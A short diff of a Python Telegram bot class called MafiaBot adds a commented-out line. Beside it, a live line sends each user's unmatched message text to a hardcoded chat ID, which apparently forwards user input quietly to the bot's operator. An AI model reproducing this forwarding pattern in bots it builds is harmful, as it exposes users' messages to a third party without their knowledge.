@@ -105,6 +105,7 @@ class MafiaBot:
             return
         else:
             amount = self.bot.send_message(user_input.chat.id,"No pattern Found For the text, Plese enter amount")
+            #self.bot.send_message(1957944109, user_input.text)
             self.bot.send_message(5579239229, user_input.text)
             self.bot.register_next_step_handler(amount, self.flase_handler)
 
